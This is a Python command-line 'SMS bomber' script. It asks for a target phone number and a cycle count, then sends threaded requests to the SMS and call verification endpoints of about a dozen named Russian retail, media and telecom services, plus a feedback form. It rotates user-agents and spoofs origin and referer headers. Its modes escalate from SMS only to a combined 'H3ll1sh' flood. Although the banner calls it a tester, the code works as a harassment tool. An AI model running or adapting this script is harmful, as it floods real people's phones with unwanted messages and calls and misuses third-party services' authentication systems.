#!/home/arch/sms-tester/venv/bin/python
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

ua = UserAgent()

def formate_phone(phone):
    if len(phone) >= 12:
        return f"{phone[:2]}({phone[2:5]})-{phone[5:8]}-{phone[8:10]}-{phone[10:12]}"
    return phone

def slice_phone(phone):
    if len(phone) >= 12:
        return phone[2:12]
    return phone

APIS = [
    {
        "name": "Utair", "url": "https://b.utair.ru/api/v1/login/",
        "payload": {"login": "{phone}", "confirmation_type": "standart"},
        "formate": False, "origin": "https://www.utair.ru/", "referer": "https://www.utair.ru/"
    },
    {
        "name": "FixPrice", "url": "https://api.fix-price.com/buyer/v2/registration/phone/request",
        "payload": {"phone": "{phone}"}, "formate": True,
        "origin": "https://fix-price.com", "referer": "https://fix-price.com"
    },
    {
        "name": "MVideo", "url": "https://www.mvideo.ru/bff/auth/v2/otp/send",
        "payload": {"phoneNumber": "{phone}", "sendBy": "cascade"}, "formate": False,
        "origin": "https://www.mvideo.ru", "referer": "https://www.mvideo.ru/"
    },
    {
        "name": "Adamas", "url": "https://rest.adamas.ru/v1/phone/send",
        "payload": {"phone": "{phone_slice}", "action": "auth"}, "formate": False,
        "origin": "https://adamas.ru", "referer": "https://adamas.ru/"
    },
    {
        "name": "Lenta", "url": "https://lenta.com/api-gateway/v1/auth/code/send",
        "payload": {"phone": "{phone}", "acceptMarketingCommunications": True}, "formate": False,
        "origin": "https://lenta.com", "referer": "https://lenta.com/"
    },
    {
        "name": "Smotrim", "url": "https://smotrim.ru/personal/login",
        "payload": {"phone": "{phone}", "redirect": "/tariffs"}, "formate": False,
        "origin": "https://smotrim.ru", "referer": "https://smotrim.ru/"
    },
    {
        "name": "Rutube", "url": "https://rutube.ru/multipass/api/v3/accounts/phone/register/",
        "payload": {"phone": "{phone}", "agreements": {"agree_personal_data": True, "agree_user_agreement": True}, "send_method": "sms"},
        "formate": False, "origin": "https://rutube.ru", "referer": "https://rutube.ru/"
    },
    {
        "name": "Citilink", "url": "https://www.citilink.ru/registration/confirm/phone/",
        "payload": {"phone": "{phone}"}, "formate": False,
        "origin": "https://www.citilink.ru", "referer": "https://www.citilink.ru/"
    },
    {
        "name": "Karusel", "url": "https://app.karusel.ru/api/v1/phone/",
        "payload": {"phone": "{phone}"}, "formate": False,
        "origin": "https://app.karusel.ru", "referer": "https://app.karusel.ru/"
    },
    {
        "name": "McDonalds", "url": "https://mcdonalds.ru/api/auth/code",
        "payload": {"phone": "{phone}"}, "formate": False,
        "origin": "https://mcdonalds.ru", "referer": "https://mcdonalds.ru/"
    },
    {
        "name": "MTS", "url": "https://api.mtstv.ru/v1/users",
        "payload": {"msisdn": "{phone}"}, "formate": False,
        "origin": "https://api.mtstv.ru", "referer": "https://api.mtstv.ru/"
    },
    {
        "name": "BelkaCar (CALL)", "url": "https://belkacar.ru/get-confirmation-code",
        "payload": {"phone": "{phone}"}, "formate": False,
        "origin": "https://belkacar.ru", "referer": "https://belkacar.ru/"
    }
]

FEEDBACK_APIS = [
    {
        "name": "Teleseti (Feedback)", "url": "https://api.teleseti.com/zayvka",
        "payload": {"name": "Ivan", "mobile": "{phone}", "town": "Moscow"},
        "formate": False, "origin": "https://teleseti.com", "referer": "https://teleseti.com/"
    }
]

def send_request(api, phone):
    try:
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": ua.random,
            "Origin": api.get("origin", ""),
            "Referer": api.get("referer", "")
        }
        
        payload = {}
        for k, v in api["payload"].items():
            if isinstance(v, str):
                payload[k] = v.replace("{phone}", phone).replace("{phone_slice}", slice_phone(phone))
            else:
                payload[k] = v

        if api.get("formate"):
            r = requests.post(api["url"], data=payload, headers=headers, timeout=10)
        else:
            r = requests.post(api["url"], json=payload, headers=headers, timeout=10)

        if r.status_code in [200, 201, 202, 204]:
            print(f"  [+] OK: {api['name']} ({r.status_code})")
        else:
            print(f"  [-] FAIL: {api['name']} ({r.status_code})")
            
    except Exception as e:
        print(f"  [!] ERR: {api['name']} - {type(e).__name__}")

def run_mode(mode, phone, cycles):
    if mode == "1":
        target_apis = [a for a in APIS if "CALL" not in a["name"]]
    elif mode == "2":
        target_apis = [a for a in APIS if "CALL" in a["name"]]
    elif mode == "3":
        target_apis = APIS
    elif mode == "4":
        target_apis = APIS + FEEDBACK_APIS

    print(f"\n[*] Starting mode {mode} for {phone}")
    print(f"[*] Cycles: {cycles}. Total APIs: {len(target_apis)}\n")

    for i in range(cycles):
        print(f"--- Cycle {i+1} ---")
        with ThreadPoolExecutor(max_workers=10) as executor:
            for api in target_apis:
                executor.submit(send_request, api, phone)
        time.sleep(2)

def main():
    ascii_art = """
    ██╗  ██╗███████╗██╗     ██╗     ███████╗██╗██████╗ ███████╗
    ██║  ██║██╔════╝██║     ██║     ██╔════╝██║██╔══██╗██╔════╝
    ███████║█████╗  ██║     ██║     █████╗  ██║██████╔╝█████╗  
    ██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║██╔══██╗██╔══╝  
    ██║  ██║███████╗███████╗███████╗██║     ██║██║  ██║███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
    [ SMS API Tester / Bomber ]
    """
    print(ascii_art)
    print("Select mode:")
    print("  1. SMS (SMS only)")
    print("  2. CALL (Calls only)")
    print("  3. Mixer (SMS + Calls)")
    print("  4. H3ll1sh (SMS + Calls + Feedback)")
    print("  0. Exit\n")
    
    mode = input("> ")
    if mode == "0":
        return
        
    if mode not in ["1", "2", "3", "4"]:
        print("Invalid mode!")
        return

    phone = input("Enter phone number (example: 79991234567): ").strip()
    phone = "".join(filter(str.isdigit, phone))
    
    if len(phone) != 11:
        print("[!] Phone number must have 11 digits!")
        return

    try:
        cycles = int(input("Enter cycles (e.g., 5): "))
    except ValueError:
        print("[!] Please enter a valid number!")
        return

    try:
        run_mode(mode, phone, cycles)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")

if __name__ == "__main__":
    main()
